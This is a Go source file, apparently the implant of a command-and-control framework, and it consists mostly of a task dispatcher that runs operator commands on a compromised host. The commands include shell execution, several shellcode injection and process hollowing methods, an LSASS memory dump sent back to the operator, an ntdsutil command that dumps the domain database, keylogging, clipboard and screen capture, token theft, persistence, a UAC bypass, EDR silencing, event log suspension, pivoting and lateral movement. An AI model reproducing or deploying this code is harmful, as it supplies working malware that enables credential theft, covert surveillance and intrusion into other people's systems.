package agent

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

type sysInfo struct {
	Hostname    string
	Username    string
	OS          string
	PID         int
	ProcessName string
	IsAdmin     bool
}

func getSysInfo() sysInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	// Prefix with domain for domain accounts (USERDOMAIN != COMPUTERNAME on Windows)
	if domain := os.Getenv("USERDOMAIN"); domain != "" && !strings.EqualFold(domain, os.Getenv("COMPUTERNAME")) {
		username = domain + "\\" + username
	}
	procName := ""
	if exe, err := os.Executable(); err == nil {
		procName = filepath.Base(exe)
	} else if len(os.Args) > 0 {
		procName = filepath.Base(os.Args[0])
	}
	return sysInfo{
		Hostname:    hostname,
		Username:    username,
		OS:          runtime.GOOS + "/" + runtime.GOARCH,
		PID:         os.Getpid(),
		ProcessName: procName,
		IsAdmin:     isElevated(),
	}
}

type transport interface {
	register(sysInfo) error
	beacon() ([]taskWire, error)
	sendResult(taskID int64, output, errStr string) error
	uploadFile(taskID int64, filename string, data []byte) error
	downloadFile(filename string) ([]byte, error)
}

// rawForwarder is implemented by transports that support N-hop pivoting.
// The SMB transport implements this by sending RELAY frames to the parent pivot.
type rawForwarder interface {
	rawForward(method, path string, body []byte) (int, []byte, error)
}

func dispatchTask(t transport, task taskWire) {
	switch task.Type {
	case "SHELL":
		output, err := runShell(task.Args)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "SLEEP":
		var args struct {
			Sec    int `json:"sec"`
			Jitter int `json:"jitter"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err == nil {
			updateSleep(args.Sec, args.Jitter)
		}
		t.sendResult(task.ID, "sleep updated", "")

	case "SYSINFO":
		info := getSysInfo()
		out := fmt.Sprintf("hostname=%s user=%s os=%s pid=%d",
			info.Hostname, info.Username, info.OS, info.PID)
		t.sendResult(task.ID, out, "")

	case "DOWNLOAD":
		var args struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		data, err := os.ReadFile(args.Path)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		filename := filepath.Base(args.Path)
		if err := t.uploadFile(task.ID, filename, data); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("uploaded %s (%d bytes)", filename, len(data)), "")

	case "UPLOAD":
		var args struct {
			Filename   string `json:"filename"`
			RemotePath string `json:"remote_path"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		data, err := t.downloadFile(args.Filename)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		if err := os.WriteFile(args.RemotePath, data, 0644); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("written %d bytes to %s", len(data), args.RemotePath), "")

	case "STAGE2":
		if task.Payload == "" {
			t.sendResult(task.ID, "", "empty shellcode payload")
			return
		}
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode shellcode: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("injecting %d bytes", len(sc)), "")
		go func() { injectShellcode(sc) }()

	case "BOF", "CLR_STOMP":
		output, err := dispatchBOF(task)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "DOTNET_EXEC":
		// Args JSON: {"asm":"<base64>","args":"<string>","type":"<opt>","method":"<opt>"}
		var da struct {
			Asm    string `json:"asm"`
			Args   string `json:"args"`
			Type   string `json:"type"`
			Method string `json:"method"`
		}
		if err := json.Unmarshal([]byte(task.Args), &da); err != nil {
			t.sendResult(task.ID, "", "bad DOTNET_EXEC args: "+err.Error())
			return
		}
		if da.Asm == "" {
			t.sendResult(task.ID, "", "DOTNET_EXEC: asm field is empty")
			return
		}
		asmBytes, err := base64.StdEncoding.DecodeString(da.Asm)
		if err != nil {
			t.sendResult(task.ID, "", "DOTNET_EXEC: base64 decode asm: "+err.Error())
			return
		}
		output, err := ExecuteAssembly(asmBytes, da.Args, da.Type, da.Method)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "BOF_LIST":
		t.sendResult(task.ID, "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "")

	case "HOOK_CHECK":
		t.sendResult(task.ID, checkHooks(), "")

	case "HW_BP_CHECK":
		if hasHWBreakpoints() {
			t.sendResult(task.ID, "[!] Hardware breakpoints DETECTED on current thread (DR0-DR3 non-zero)", "")
		} else {
			t.sendResult(task.ID, "[+] No hardware breakpoints detected", "")
		}

	case "THREAD_HIJACK":
		// Args: "<pid>"  Payload: shellcode (base64)
		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid: "+err.Error())
			return
		}
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode shellcode: "+err.Error())
			return
		}
		out, err := injectRemoteHijack(pid, sc)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "MEM_FLUCTUATE":
		// Args: "start [interval_sec]" | "stop"
		parts := strings.Fields(task.Args)
		if len(parts) == 0 || parts[0] == "stop" {
			StopScramblerDaemon()
			t.sendResult(task.ID, "[+] memory scrambler stopped", "")
			return
		}
		intervalSec := 10
		if len(parts) >= 2 {
			if n, err := strconv.Atoi(parts[1]); err == nil && n > 0 {
				intervalSec = n
			}
		}
		StartScramblerDaemon(time.Duration(intervalSec) * time.Second)
		t.sendResult(task.ID, fmt.Sprintf("[+] memory scrambler started (interval %ds)", intervalSec), "")

	// ── Filesystem ────────────────────────────────────────────────────────────

	case "PWD":
		wd, err := os.Getwd()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, wd, "")

	case "CD":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			home, _ := os.UserHomeDir()
			path = home
		}
		if err := os.Chdir(path); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		wd, _ := os.Getwd()
		t.sendResult(task.ID, wd, "")

	case "LS":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			path = "."
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		var sb strings.Builder
		for _, e := range entries {
			info, _ := e.Info()
			if e.IsDir() {
				fmt.Fprintf(&sb, "d  %-12s  %s\n", "", e.Name())
			} else if info != nil {
				fmt.Fprintf(&sb, "f  %-12d  %s\n", info.Size(), e.Name())
			}
		}
		t.sendResult(task.ID, sb.String(), "")

	case "LS_JSON":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			path = "."
		}
		absPath, _ := filepath.Abs(path)
		entries, err := os.ReadDir(absPath)
		if err != nil {
			data, _ := json.Marshal(map[string]string{"error": err.Error()})
			t.sendResult(task.ID, string(data), "")
			return
		}
		type fsEntry struct {
			Name  string `json:"name"`
			IsDir bool   `json:"is_dir"`
			Size  int64  `json:"size"`
			Mod   string `json:"mod"`
		}
		items := make([]fsEntry, 0, len(entries))
		for _, e := range entries {
			info, _ := e.Info()
			item := fsEntry{Name: e.Name(), IsDir: e.IsDir()}
			if info != nil {
				item.Size = info.Size()
				item.Mod = info.ModTime().UTC().Format("2006-01-02 15:04")
			}
			items = append(items, item)
		}
		wd, _ := os.Getwd()
		data, _ := json.Marshal(map[string]interface{}{
			"cwd":     wd,
			"path":    absPath,
			"entries": items,
		})
		t.sendResult(task.ID, string(data), "")

	case "PS_JSON":
		output, err := listProcessesJSON()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "MKDIR":
		path := strings.TrimSpace(task.Args)
		if err := os.MkdirAll(path, 0755); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "created: "+path, "")

	case "RM":
		path := strings.TrimSpace(task.Args)
		if err := os.RemoveAll(path); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "removed: "+path, "")

	case "ENV":
		var sb strings.Builder
		for _, e := range os.Environ() {
			sb.WriteString(e + "\n")
		}
		t.sendResult(task.ID, sb.String(), "")

	case "CAT":
		data, err := os.ReadFile(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, string(data), "")

	// ── Process ───────────────────────────────────────────────────────────────

	case "GETPID":
		t.sendResult(task.ID, fmt.Sprintf("%d", os.Getpid()), "")

	case "PPID":
		t.sendResult(task.ID, fmt.Sprintf("%d", os.Getppid()), "")

	case "EVASION_STATUS":
		spoofGadget := getSpoofGadgetAddr()
		status := fmt.Sprintf(
			"SleepMaskMode : %s\nEvasionPatches: %s\nAMSIMethod    : %s\nPPIDSpoof     : %s\nSpoofGadget   : 0x%x\n",
			SleepMaskMode, EvasionPatches, AMSIMethod, PPIDSpoof, spoofGadget,
		)
		t.sendResult(task.ID, status, "")

	case "PS":
		output, err := listProcesses()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	// ── Cleanup ───────────────────────────────────────────────────────────────

	case "CLEANUP":
		t.sendResult(task.ID, "cleaning up...", "")
		go selfCleanup()

	// ── Pivot ─────────────────────────────────────────────────────────────────

	case "SOCKS_START":
		// Args: "<port> [user:pass]"
		parts := strings.Fields(task.Args)
		port := 1080
		var socksU, socksP string
		if len(parts) >= 1 {
			if p, err := strconv.Atoi(parts[0]); err == nil {
				port = p
			}
		}
		if len(parts) >= 2 {
			if idx := strings.Index(parts[1], ":"); idx > 0 {
				socksU = parts[1][:idx]
				socksP = parts[1][idx+1:]
			}
		}
		addr, err := startSOCKS5(port, socksU, socksP)
		if err != nil {
			t.sendResult(task.ID, "", "SOCKS5 start failed: "+err.Error())
			return
		}
		msg := "SOCKS5 listening on " + addr
		if socksU != "" {
			msg += " (auth: " + socksU + ")"
		}
		t.sendResult(task.ID, msg, "")

	case "SOCKS_STOP":
		stopSOCKS5()
		t.sendResult(task.ID, "SOCKS5 stopped", "")

	case "PORTFWD_ADD":
		// Args: "[proto] <lport> <rhost> <rport>"  proto defaults to "tcp"
		parts := strings.Fields(task.Args)
		proto := "tcp"
		if len(parts) == 4 && (parts[0] == "tcp" || parts[0] == "udp") {
			proto = parts[0]
			parts = parts[1:]
		}
		if len(parts) < 3 {
			t.sendResult(task.ID, "", "usage: [tcp|udp] <lport> <rhost> <rport>")
			return
		}
		lport, e1 := strconv.Atoi(parts[0])
		rport, e2 := strconv.Atoi(parts[2])
		if e1 != nil || e2 != nil {
			t.sendResult(task.ID, "", "invalid port numbers")
			return
		}
		if err := addPortFwdProto(proto, lport, parts[1], rport); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("%s forwarding :%d → %s:%d", proto, lport, parts[1], rport), "")

	case "PORTFWD_DEL":
		// Args: "[proto] <lport>"
		parts := strings.Fields(task.Args)
		proto := "tcp"
		portStr := ""
		if len(parts) == 2 && (parts[0] == "tcp" || parts[0] == "udp") {
			proto = parts[0]
			portStr = parts[1]
		} else if len(parts) == 1 {
			portStr = parts[0]
		}
		lport, err := strconv.Atoi(portStr)
		if err != nil {
			t.sendResult(task.ID, "", "invalid port")
			return
		}
		delPortFwdProto(proto, lport)
		t.sendResult(task.ID, fmt.Sprintf("%s port forward :%d removed", proto, lport), "")

	case "PORTFWD_LIST":
		t.sendResult(task.ID, listPortFwds(), "")

	// ── Windows-specific (stubs on other platforms) ────────────────────────────

	case "SCREENSHOT":
		output, err := takeScreenshot(t, task.ID)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "INJECT_REMOTE":
		// Args: "<pid>" Payload: shellcode (base64)
		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid")
			return
		}
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		if err := injectRemote(pid, sc); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("injected %d bytes into PID %d", len(sc), pid), "")

	case "TOKEN_STEAL", "STEAL_TOKEN":
		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid")
			return
		}
		out, err := stealToken(pid)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "TOKEN_MAKE":
		// Args: "<domain>\<user> <password>"
		parts := strings.SplitN(task.Args, " ", 2)
		if len(parts) < 2 {
			t.sendResult(task.ID, "", `usage: <domain\user> <password>`)
			return
		}
		out, err := makeToken(parts[0], parts[1])
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "TOKEN_DROP", "REV2SELF":
		out, err := dropToken()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "TOKEN_WHOAMI":
		t.sendResult(task.ID, tokenWhoami(), "")

	case "PERSIST", "PERSIST_TASK", "PERSIST_RM":
		// PERSIST_TASK → schtask method; PERSIST_RM → remove; PERSIST → explicit method
		var pa struct {
			Method string `json:"method"`
			Cmd    string `json:"cmd"`
			Name   string `json:"name"`
		}
		switch task.Type {
		case "PERSIST_TASK":
			pa.Method = "schtask"
			pa.Name = strings.TrimSpace(task.Args)
			if exe, err := os.Executable(); err == nil {
				pa.Cmd = exe
			} else {
				pa.Cmd = os.Args[0]
			}
		case "PERSIST_RM":
			pa.Method = "rm"
			pa.Name = strings.TrimSpace(task.Args)
		default:
			if err := json.Unmarshal([]byte(task.Args), &pa); err != nil {
				// fallback: space-separated
				f := strings.Fields(task.Args)
				if len(f) >= 2 {
					pa.Method = f[0]
					pa.Cmd = strings.Join(f[1:], " ")
				} else if len(f) == 1 {
					pa.Method = f[0]
				}
			}
		}
		out, err := persistMethod(pa.Method, pa.Cmd, pa.Name)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "FORK_RUN":
		// Args: process path (optional). Payload: shellcode
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		out, err := forkRun(sc, strings.TrimSpace(task.Args))
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "HOLLOW":
		// Args JSON: {"target":"<proc_path_optional>","payload":"<uploaded_filename>"}
		var ha struct {
			Target  string `json:"target"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal([]byte(task.Args), &ha); err != nil {
			t.sendResult(task.ID, "", "bad HOLLOW args: "+err.Error())
			return
		}
		sc, err := t.downloadFile(ha.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "hollow: download '"+ha.Payload+"': "+err.Error())
			return
		}
		out, err := hollowProcess(ha.Target, sc)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "UDRL":
		// Args JSON: {"payload":"<uploaded_filename>","host_dll":"<optional override>"}
		var ua struct {
			Payload string `json:"payload"`
			HostDLL string `json:"host_dll"`
		}
		if err := json.Unmarshal([]byte(task.Args), &ua); err != nil {
			t.sendResult(task.ID, "", "bad UDRL args: "+err.Error())
			return
		}
		sc, err := t.downloadFile(ua.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "udrl: download '"+ua.Payload+"': "+err.Error())
			return
		}
		out, err := phantomLoad(sc)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "BLOCKDLLS":
		// Args: "on" or "off"
		enable := strings.ToLower(strings.TrimSpace(task.Args)) != "off"
		out, err := blockDLLs(enable)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "GEN_LNK":
		// Args JSON: {"target":"...","args":"...","working_dir":"...","icon_path":"...","icon_index":0,"outfile":"..."}
		var opts GenLNKOptions
		if err := json.Unmarshal([]byte(task.Args), &opts); err != nil {
			t.sendResult(task.ID, "", "bad GEN_LNK args: "+err.Error())
			return
		}
		out, err := genLNK(opts)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "COM_HIJACK":
		// Args JSON: {"clsid":"...","dll":"...","name":"..."}  or "rm <clsid>"
		if strings.HasPrefix(strings.TrimSpace(task.Args), "rm ") {
			clsid := strings.TrimSpace(strings.TrimPrefix(task.Args, "rm "))
			out, err := comHijackRemove(clsid)
			errStr := ""
			if err != nil {
				errStr = err.Error()
			}
			t.sendResult(task.ID, out, errStr)
			return
		}
		var chArgs struct {
			CLSID string `json:"clsid"`
			DLL   string `json:"dll"`
			Name  string `json:"name"`
		}
		if err := json.Unmarshal([]byte(task.Args), &chArgs); err != nil {
			t.sendResult(task.ID, "", "bad COM_HIJACK args: "+err.Error())
			return
		}
		out, err := comHijack(chArgs.CLSID, chArgs.DLL, chArgs.Name)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "MINIDUMP":
		// Args: optional PID (0 = auto-find lsass.exe)
		var pid uint32
		if task.Args != "" {
			if p, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32); err == nil {
				pid = uint32(p)
			}
		}
		data, err := lsassDump(pid)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		if err := t.uploadFile(task.ID, "lsass.dmp", data); err != nil {
			t.sendResult(task.ID, "", "upload: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("lsass dump uploaded (%d bytes)", len(data)), "")

	case "PORT_SCAN":
		// Args: "<target> [ports] [timeout_ms]"
		// If ports is omitted or "-", runs host-discovery mode (ARP + TCP probe).
		parts := strings.Fields(task.Args)
		if len(parts) < 1 {
			t.sendResult(task.ID, "", "usage: PORT_SCAN <target> [ports] [timeout_ms]")
			return
		}
		timeoutMs := 500
		portArg := ""
		if len(parts) >= 2 && parts[1] != "-" {
			portArg = parts[1]
		}
		if len(parts) >= 3 {
			if ms, err := strconv.Atoi(parts[2]); err == nil {
				timeoutMs = ms
			}
		} else if len(parts) == 2 {
			// second arg might be timeout (all digits) when ports omitted
			if ms, err := strconv.Atoi(parts[1]); err == nil {
				portArg = ""
				timeoutMs = ms
			}
		}
		if portArg == "" {
			hosts := expandTargets(parts[0])
			out := hostDiscover(hosts, timeoutMs)
			t.sendResult(task.ID, out, "")
		} else {
			out := portScan(parts[0], portArg, timeoutMs)
			t.sendResult(task.ID, out, "")
		}

	case "INJECT_APC":
		// Early-bird APC injection. Args: process (optional). Payload: shellcode.
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		type apcRes struct{ out, errStr string }
		ch := make(chan apcRes, 1)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					ch <- apcRes{"", fmt.Sprintf("panic: %v", r)}
				}
			}()
			o, e := forkRunAPC(sc, strings.TrimSpace(task.Args))
			es := ""
			if e != nil {
				es = e.Error()
			}
			ch <- apcRes{o, es}
		}()
		select {
		case r := <-ch:
			t.sendResult(task.ID, r.out, r.errStr)
		case <-time.After(10 * time.Second):
			t.sendResult(task.ID, "[+] APC queued (async)", "")
		}

	// ── Keylogger ─────────────────────────────────────────────────────────────

	case "KEYLOG_START":
		out, err := startKeylog()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "KEYLOG_STOP":
		out, err := stopKeylog()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "KEYLOG_DUMP":
		t.sendResult(task.ID, dumpKeylog(), "")

	case "CLIP_GET":
		out, err := getClipboard()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "CLIP_MONITOR_START":
		interval := 5
		if task.Args != "" {
			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
				interval = n
			}
		}
		out, err := startClipMonitor(interval)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "CLIP_MONITOR_DUMP":
		t.sendResult(task.ID, dumpClipMonitor(), "")

	case "CLIP_MONITOR_STOP":
		t.sendResult(task.ID, stopClipMonitor(), "")

	// ── HTTP reverse-proxy pivot ──────────────────────────────────────────────

	// ── Reverse SOCKS5 ───────────────────────────────────────────────────────

	case "RSOCKS_START":
		port := strings.TrimSpace(task.Args)
		if port == "" {
			t.sendResult(task.ID, "", "usage: RSOCKS_START <callback_port>")
			return
		}
		if err := startRSocks(port); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "[+] reverse SOCKS5 tunnel established (callback port "+port+")", "")

	case "RSOCKS_STOP":
		t.sendResult(task.ID, stopRSocks(), "")

	case "HTTP_PIVOT_START":
		port := 8888
		if task.Args != "" {
			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
				port = p
			}
		}
		if err := startHTTPPivot(port); err != nil {
			t.sendResult(task.ID, "", "http pivot start failed: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] HTTP pivot listening on :%d", port), "")

	case "HTTP_PIVOT_STOP":
		t.sendResult(task.ID, stopHTTPPivot(), "")

	// ── SMB named pipe pivot server ───────────────────────────────────────────

	case "PIPE_START":
		pipeName := strings.TrimSpace(task.Args)
		if err := startPipeServer(pipeName); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		pipe := pipeName
		if pipe == "" {
			pipe = `\\.\pipe\svcctl`
		}
		t.sendResult(task.ID, "[+] pipe server listening on "+pipe, "")

	case "PIPE_STOP":
		t.sendResult(task.ID, stopPipeServer(), "")

	// ── WinRM lateral movement ────────────────────────────────────────────────

	case "WINRM_EXEC":
		// Args JSON: {"target":"host","user":"dom\\user","pass":"pwd","cmd":"whoami"}
		var wa struct {
			Target string `json:"target"`
			User   string `json:"user"`
			Pass   string `json:"pass"`
			Cmd    string `json:"cmd"`
		}
		if err := json.Unmarshal([]byte(task.Args), &wa); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		out, err := winrmExec(wa.Target, wa.User, wa.Pass, wa.Cmd)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "WINRM_DEPLOY":
		// Args JSON: {"target":"host","user":"dom\\user","pass":"pwd","payload":"<PS one-liner>"}
		var wa struct {
			Target  string `json:"target"`
			User    string `json:"user"`
			Pass    string `json:"pass"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal([]byte(task.Args), &wa); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		out, err := winrmDeploy(wa.Target, wa.User, wa.Pass, wa.Payload)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "ISHELL_OPEN":
		shell := strings.ToLower(strings.TrimSpace(task.Args))
		if err := ishellOpen(shell); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "[+] interactive shell active", "")

	case "ISHELL_RUN":
		out, err := ishellRun(task.Args)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "ISHELL_CLOSE":
		ishellClose()
		t.sendResult(task.ID, "[+] shell closed", "")

	case "KILL":
		t.sendResult(task.ID, "bye", "")
		os.Exit(0)

	// ── Token Store ───────────────────────────────────────────────────────────

	case "TOKEN_STORE_STEAL":
		pid, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32)
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid: "+err.Error())
			return
		}
		id, user, err := tsStealAndAdd(uint32(pid))
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] token #%d stolen from PID %d (%s)", id, pid, user), "")

	case "TOKEN_STORE_SHOW":
		t.sendResult(task.ID, tsShowStore(), "")

	case "TOKEN_STORE_USE":
		id, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid id: "+err.Error())
			return
		}
		t.sendResult(task.ID, tsUseStore(id), "")

	case "TOKEN_STORE_REMOVE":
		id, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid id: "+err.Error())
			return
		}
		t.sendResult(task.ID, tsRemoveStore(id), "")

	case "TOKEN_STORE_CLEAR":
		t.sendResult(task.ID, tsClearStore(), "")

	// ── Screenwatch ───────────────────────────────────────────────────────────

	case "SCREENWATCH_START":
		intervalSec := 30
		if task.Args != "" {
			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
				intervalSec = n
			}
		}
		startScreenWatchCmd(t, task.ID, intervalSec)
		t.sendResult(task.ID, fmt.Sprintf("[+] screenwatch started (interval %ds)", intervalSec), "")

	case "SCREENWATCH_STOP":
		t.sendResult(task.ID, stopScreenWatchCmd(), "")

	// ── BOF Store ────────────────────────────────────────────────────────────

	case "BOF_STORE_LOAD":
		name := strings.TrimSpace(task.Args)
		if name == "" {
			t.sendResult(task.ID, "", "usage: BOF_STORE_LOAD <name> (payload=base64 COFF)")
			return
		}
		if task.Payload == "" {
			t.sendResult(task.ID, "", "empty payload")
			return
		}
		data, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		bofDSLoad(name, data)
		t.sendResult(task.ID, fmt.Sprintf("[+] BOF '%s' loaded into store (%d bytes)", name, len(data)), "")

	case "BOF_STORE_LIST":
		t.sendResult(task.ID, bofDSList(), "")

	case "BOF_STORE_UNLOAD":
		name := strings.TrimSpace(task.Args)
		bofDSRemove(name)
		t.sendResult(task.ID, fmt.Sprintf("[+] BOF '%s' removed from store", name), "")

	// ── EDR Silencing (WFP firewall rule) ─────────────────────────────────────

	case "EDR_SILENCE":
		t.sendResult(task.ID, edrSilence(task.Args), "")

	case "EDR_SILENCE_RM":
		t.sendResult(task.ID, edrSilenceRemove(task.Args), "")

	// ── Event Log Suspension ──────────────────────────────────────────────────

	case "EVENTLOG_SUSPEND":
		t.sendResult(task.ID, eventlogSuspend(), "")

	case "EVENTLOG_RESUME":
		t.sendResult(task.ID, eventlogResume(), "")

	// ── UAC Bypass ───────────────────────────────────────────────────────────

	case "ELEVATE":
		// Args: "fodhelper <cmd>" | "computerdefaults <cmd>" | "cmlua <cmd>"
		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
		method := ""
		cmd := ""
		if len(parts) >= 1 {
			method = strings.ToLower(parts[0])
		}
		if len(parts) >= 2 {
			cmd = parts[1]
		}
		var out string
		switch method {
		case "computerdefaults":
			out = uacComputerDefaults(cmd)
		case "cmlua":
			out = uacBypassCMLUA(cmd)
		default: // fodhelper
			out = uacFodHelper(cmd)
		}
		t.sendResult(task.ID, out, "")

	// ── PEB Masquerading ──────────────────────────────────────────────────────

	case "PEB_SPOOF":
		t.sendResult(task.ID, pebSpoof(strings.TrimSpace(task.Args)), "")

	// ── HWBP Clear ────────────────────────────────────────────────────────────

	case "HWBP_CLEAR":
		clearHardwareBreakpoints()
		t.sendResult(task.ID, "[+] hardware breakpoints cleared", "")

	// ── ntds.dit dump via ntdsutil ────────────────────────────────────────────

	case "NTDS_DUMP":
		outDir := strings.TrimSpace(task.Args)
		if outDir == "" {
			outDir = `C:\Windows\Temp\ntdsutil_out`
		}
		cmd := fmt.Sprintf(`ntdsutil "ac i ntds" "ifm" "create full %s" q q`, outDir)
		out, err := runShell(cmd)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] ntds.dit dump to %s\n%s", outDir, out), errStr)

	// ── Lateral movement ──────────────────────────────────────────────────────
	// Args JSON: {"method":"psexec|wmi|winrm|ssh|dcom","host":"<ip>","payload":"<file>",
	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}

	case "JUMP", "LATERAL":
		var la struct {
			Method  string `json:"method"`
			Host    string `json:"host"`
			Payload string `json:"payload"`
			SvcName string `json:"svcname"`
			User    string `json:"user"`
			Pass    string `json:"pass"`
		}
		if err := json.Unmarshal([]byte(task.Args), &la); err != nil {
			t.sendResult(task.ID, "", "bad LATERAL args: "+err.Error())
			return
		}
		if la.Host == "" || la.Payload == "" {
			t.sendResult(task.ID, "", "LATERAL: host and payload are required")
			return
		}
		payloadBytes, err := t.downloadFile(la.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
			return
		}
		out, err := runLateral(la.Method, la.Host, payloadBytes, la.SvcName, la.User, la.Pass)
		errStr := ""
